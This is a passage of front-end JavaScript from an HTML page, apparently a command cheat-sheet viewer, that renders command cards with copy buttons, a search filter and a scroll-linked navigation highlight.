  a.innerHTML = `<span class="sw" style="background:var(${g.color})"></span>${g.title}`;
  navlist.appendChild(a);

  // section
  const sec = document.createElement('section');
  sec.className = 'group';
  sec.id = g.id;
  sec.style.setProperty('--gc', `var(${g.color})`);
  sec.dataset.title = g.title.toLowerCase();

  sec.innerHTML = `
    <div class="group-head"><h3>${g.title}</h3></div>
    <p class="group-desc">${g.desc}</p>
    <div class="group-rule"></div>
    <div class="grid"></div>
  `;
  const grid = sec.querySelector('.grid');

  g.cmds.forEach(c => {
    const [cmd, desc, example] = c;
    const card = document.createElement('div');
    card.className = 'card';
    card.dataset.search = (cmd + ' ' + desc + ' ' + (example||'')).toLowerCase();
    card.innerHTML = `
      <div class="cmdrow">
        <code>${cmd}</code>
        <button class="copybtn" type="button">copy</button>
      </div>
      <div class="desc">${desc}</div>
      ${example ? `<div class="example">${example}</div>` : ''}
    `;
    const btn = card.querySelector('.copybtn');
    btn.addEventListener('click', () => {
      const raw = cmd.replace(/&lt;/g,'<').replace(/&gt;/g,'>').replace(/&amp;/g,'&');
      navigator.clipboard.writeText(raw).then(() => {
        btn.textContent = 'copied';
        btn.classList.add('copied');
        setTimeout(()=>{btn.textContent='copy';btn.classList.remove('copied');}, 1200);
      });
    });
    grid.appendChild(card);
  });

  content.appendChild(sec);
});

document.getElementById('totalcount').textContent =
  DATA.reduce((n,g)=>n+g.cmds.length,0) + ' commands across ' + DATA.length + ' sections';

/* ===== search / filter ===== */
const search = document.getElementById('search');
const noresults = document.getElementById('noresults');
const stat = document.getElementById('stat');

search.addEventListener('input', () => {
  const q = search.value.trim().toLowerCase();
  let visibleTotal = 0;
  document.querySelectorAll('section.group').forEach(sec => {
    let visibleInSection = 0;
    sec.querySelectorAll('.card').forEach(card => {
      const match = !q || card.dataset.search.includes(q);
      card.classList.toggle('hidden', !match);
      if (match) visibleInSection++;
    });
    sec.classList.toggle('hidden', visibleInSection === 0);
    visibleTotal += visibleInSection;
  });
  noresults.style.display = visibleTotal === 0 ? 'block' : 'none';
  stat.textContent = q ? visibleTotal + ' matches' : '';
});

/* ===== active nav highlight on scroll ===== */
const navlinks = [...document.querySelectorAll('.navlink')];
const sections = [...document.querySelectorAll('section.group')];
const io = new IntersectionObserver((entries) => {
  entries.forEach(e => {
    if (e.isIntersecting) {
      navlinks.forEach(l => l.classList.remove('active'));
      const link = navlinks.find(l => l.getAttribute('href') === '#' + e.target.id);
      if (link) link.classList.add('active');
    }
  });
}, { rootMargin: '-10% 0px -80% 0px' });
sections.forEach(s => io.observe(s));
</script>
</body>
</html>
